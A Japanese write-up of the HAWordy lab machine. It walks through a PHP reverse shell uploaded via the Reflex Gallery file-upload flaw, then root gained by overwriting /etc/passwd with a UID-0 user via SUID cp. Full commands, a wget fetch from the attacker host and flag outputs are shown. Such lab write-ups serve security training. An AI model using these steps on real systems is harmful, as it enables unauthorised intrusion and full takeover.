+++
title = "Proving Grounds Practice - HAWordy Writeup"
date = "2026-11-16"
description = "WordPressのReflex Galleryプラグインの任意ファイルアップロード脆弱性を利用してwww-dataのシェルを取得。SUIDが設定されたcpを利用して/etc/passwdを書き換え、root権限を取得する"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[HAWordy]", "[WordPress]", "[Reflex Gallery]", "[Arbitrary File Upload]", "[Reverse Shell]", "[SUID]", "[Privilege Escalation]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | HAWordy |
| OS | Ubuntu 18.04 |
| Target IP | 192.168.128.23 |
| Web Server | Apache 2.4.29 |
| WordPress Plugin | Reflex Gallery 3.1.3 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャンとサービス検出を実行する。

```bash
nmap -sV -sC -p- 192.168.128.23
```

スキャン結果：

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

80/tcpのみが開いており、Apache 2.4.29が稼働していることを確認した。

Webサービスを起点とした攻撃を調査する。

### WordPress Enumeration

WordPressが `/wordpress/` に配置されていることを確認したため、WPScanでプラグインの列挙を行う。

```bash
wpscan --url http://192.168.128.23/wordpress/ -e ap
```

結果：

```text
[+] reflex-gallery
 | Location: http://192.168.128.23/wordpress/wp-content/plugins/reflex-gallery/
 | Last Updated: 2021-03-10
 | Active Installs: 100
 | Readme: http://192.168.128.23/wordpress/wp-content/plugins/reflex-gallery/readme.txt
 | [!] The version is out of date, the latest version is 3.1.7
 | [!] Directory listing is enabled
 |
 | Version: 3.1.3 (80% confidence)
 | Found By: Readme - Stable Tag
```

`Reflex Gallery` のバージョンが3.1.3であり、古いバージョンであることが分かった。

### Searchsploit

Searchsploitで既知の脆弱性を調査する。

```bash
searchsploit reflex gallery
```

結果：

```text
Exploit Title
---------------------------------------------------------------
WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit)
WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload
```

Reflex Gallery 3.1.3に任意ファイルアップロードの脆弱性が存在することを確認した。

該当するExploitは以下のとおり。

- 36374 - WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload
- 36809 - WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit)

この脆弱性を利用してPHPファイルをアップロードし、Reverse Shellの取得を試みる。

---

## Initial Access

### Arbitrary File Upload

Exploitの内容を確認すると、以下のエンドポイントに対してファイルをアップロードできることが分かった。

```text
/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
```

アップロード処理では、`qqfile` というパラメータでファイルを送信する。

Exploitに記載されていたHTMLフォーム：

```html
<form method="POST"
action="http://192.168.128.23:1337/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03"
enctype="multipart/form-data">

<input type="file" name="qqfile">
<input type="submit" name="Submit" value="Pwn!">

</form>
```

アップロードされたファイルは、指定したYearとMonthに対応するディレクトリに保存される。

### PHP Reverse Shell Upload

PHP Reverse Shellを用意し、curlでアップロードする。

Kali側で待ち受けを開始する。

```bash
nc -lvnp 4444
```

続いて、対象ホストにPHPファイルをアップロードする。

```bash
curl -X POST \
-F "qqfile=@php-reverse-shell.php" \
"http://192.168.128.23/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2026&Month=11"
```

実行結果：

```json
{
  "success": true,
  "fileName": "\/2026\/11\/php-reverse-shell37.php"
}
```

アップロードに成功した。

ファイル名に `37` が付加されているため、実際のファイル名は `php-reverse-shell37.php` となっている。

アップロード先は以下のとおり。

```text
/wordpress/wp-content/uploads/2026/11/php-reverse-shell37.php
```

### Reverse Shell

Kali側でNetcatの接続を待ち受ける。

```bash
nc -lvnp 4444
```

アップロードしたPHPファイルにHTTP経由でアクセスすると、Reverse Shellの接続が確立した。

```text
listening on [any] 4444 ...
connect to [192.168.45.236] from (UNKNOWN) [192.168.128.23] 36964

Linux ubuntu 5.0.0-27-generic #28~18.04.1-Ubuntu SMP Thu Aug 22 03:00:32 UTC 2019 x86_64

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off
```

これにより、`www-data` として対象ホストへの初期アクセスを取得できた。

### Local Flag

取得したシェルから `local.txt` を確認する。

```bash
cat local.txt
```

結果：

```text
4b237cc54634548ddb029d31f9fbaec1
```

Local Flagを取得した。

---

## Privilege Escalation

### SUID Enumeration

初期アクセス後、権限昇格につながる可能性のあるSUIDファイルを検索する。

```bash
find / -perm -u=s -type f 2>/dev/null
```

結果：

```text
/usr/bin/wget
/bin/cp
```

通常、SUIDが設定された実行ファイルは、実行時にファイル所有者の実効UIDで動作する。

今回、`wget` と `cp` が検出された。

特に `/bin/cp` は、ファイルのコピーを行うプログラムである。

このファイルにroot所有のSUIDが設定されている場合、root権限でファイルを書き換えられる可能性がある。

そこで、`cp` を利用して `/etc/passwd` を書き換える方法を試す。

### Generate Password Hash

Kali側で、追加するユーザー `hack` のパスワードハッシュを生成する。

```bash
openssl passwd -1 -salt hack pass
```

結果：

```text
$1$hack$zgcWhKUnUA2Dy.zN1vDOy.
```

このハッシュは、パスワード `pass` に対応するMD5ベースのcrypt形式である。

### Prepare passwd File

Kali側で `/etc/passwd` のコピーを用意し、その末尾に以下のエントリーを追加する。

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:124:65534::/run/sshd:/usr/sbin/nologin
hack:$1$hack$zgcWhKUnUA2Dy.zN1vDOy.:0:0:root:/root:/bin/bash
```

`/etc/passwd` の各フィールドは以下の形式になっている。

```text
username:password:UID:GID:GECOS:HOME:SHELL
```

今回追加したエントリーの意味は次のとおり。

| Field | Value | Meaning |
|-------|-------|---------|
| username | hack | ユーザー名 |
| password | $1$hack$... | パスワードハッシュ |
| UID | 0 | rootと同じUID |
| GID | 0 | rootグループ |
| GECOS | root | コメント |
| HOME | /root | ホームディレクトリ |
| SHELL | /bin/bash | ログインシェル |

UIDに `0` を指定することで、rootと同じUIDを持つユーザーを定義する。

パスワードは `pass` に設定している。

作成したファイルをKali側のHTTPサーバーで公開する。

```bash
python3 -m http.server 80
```

### Transfer passwd File

対象ホスト側からKaliにアクセスし、作成したpasswdファイルをダウンロードする。

```bash
wget http://192.168.45.236/passwd
```

ダウンロードに成功すると、以下のように表示される。

```text
HTTP request sent, awaiting response... 200 OK
Length: 56 [application/octet-stream]
Saving to: 'passwd'
```

※同名ファイルが既に存在する場合は `passwd.1` など別のファイル名で保存されるため、実際にダウンロードしたファイル名を確認する。

### Overwrite /etc/passwd

まず、元の `/etc/passwd` をバックアップする。

```bash
cp /etc/passwd /dev/shm/passwd.bak2
```

続いて、SUIDが設定された `/bin/cp` を利用して、用意したpasswdファイルを `/etc/passwd` にコピーする。

```bash
cp passwd /etc/passwd
```

ここで `passwd` は、元の `/etc/passwd` の内容を保持したうえで、`hack` のエントリーを追加したファイルである。

SUID-rootの `cp` が動作することで、通常の `www-data` では書き換えられない `/etc/passwd` を上書きできる。

### Obtain TTY

PTYを取得する。

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

これにより、対話的なシェルを利用できるようになる。

### Switch to hack

TTY取得後、追加したユーザー `hack` に切り替える。

```bash
su hack
```

パスワードを入力する。

```text
Password: pass
```

認証に成功すると、root権限のシェルを取得できる。

```text
root@ubuntu:~#
```

### Root Flag

最後にrootのProofを確認する。

```bash
cat proof.txt
```

結果：

```text
d9ba88e0ac5f4faac50fd17b5f73a6f2
```

Root Flagを取得した。

---

## Summary

今回のHAWordyでは、WordPressの古いプラグインであるReflex Gallery 3.1.3の任意ファイルアップロード脆弱性を利用して初期アクセスを取得した。

その後、SUIDファイルを列挙したところ、`/usr/bin/wget` と `/bin/cp` が見つかった。

特にSUIDが設定された `/bin/cp` に注目し、既存の `/etc/passwd` にUID 0のユーザーを追加することで、root権限を取得できた。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービス列挙
2. WPScanによるWordPressプラグイン列挙
3. SearchsploitによるReflex Galleryの脆弱性調査
4. Arbitrary File UploadによるPHP Reverse Shellのアップロード
5. Reverse Shellによるwww-dataのシェル取得
6. local.txtの取得
7. SUIDファイルの列挙
8. SUIDが設定された `/bin/cp` の発見
9. OpenSSLによるパスワードハッシュの生成
10. `/etc/passwd` にUID 0のユーザーを追加
11. SUID-rootのcpによる `/etc/passwd` の書き換え
12. PythonによるPTYの取得
13. `su hack` によるroot権限の取得
14. proof.txtの取得


